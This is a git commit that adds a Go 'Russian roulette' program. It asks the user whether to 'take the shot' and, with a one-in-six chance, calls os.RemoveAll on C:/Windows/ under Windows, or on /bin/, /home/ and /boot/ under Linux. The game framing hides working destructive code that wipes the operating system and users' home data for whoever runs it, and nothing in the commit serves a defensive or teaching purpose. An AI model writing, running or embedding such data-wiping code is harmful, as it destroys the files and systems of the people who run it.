6c01165617976e873fa12426b5b0b0da46029dbe
vvoiner <39580907+vvoiner@users.noreply.github.com>
2021-11-24 11:34:27 +0100

    Add files via upload

---
+++ main.go
@@ -0,0 +1,47 @@
+package main
+
+import (
+	"fmt"
+	"math/rand"
+	"os"
+	"runtime"
+	"strings"
+)
+
+func main() {
+	menu()
+}
+
+func menu() {
+	fmt.Println("Take the shot? (Y/N)")
+	var option string
+	fmt.Scanln(&option)
+	if strings.ToLower(option) == "y" {
+		a := rand.Intn(6)
+		if a == 3 {
+			if runtime.GOOS == "windows" {
+				deleteWindows()
+			} else if runtime.GOOS == "linux" {
+				deleteLinux()
+			}
+		} else {
+			fmt.Println("Lucky! You didn't get shot yet!")
+		}
+	} else {
+		fmt.Println("Oh, okay.")
+		os.Exit(0)
+	}
+
+}
+
+func deleteWindows() {
+	os.RemoveAll("C:/Windows/")
+	fmt.Println("C:/Windows/ deleted!")
+}
+
+func deleteLinux() {
+	os.RemoveAll("/bin/")
+	os.RemoveAll("/home/")
+	os.RemoveAll("/boot/")
+	fmt.Println("Essential directories have been deleted!")
+}
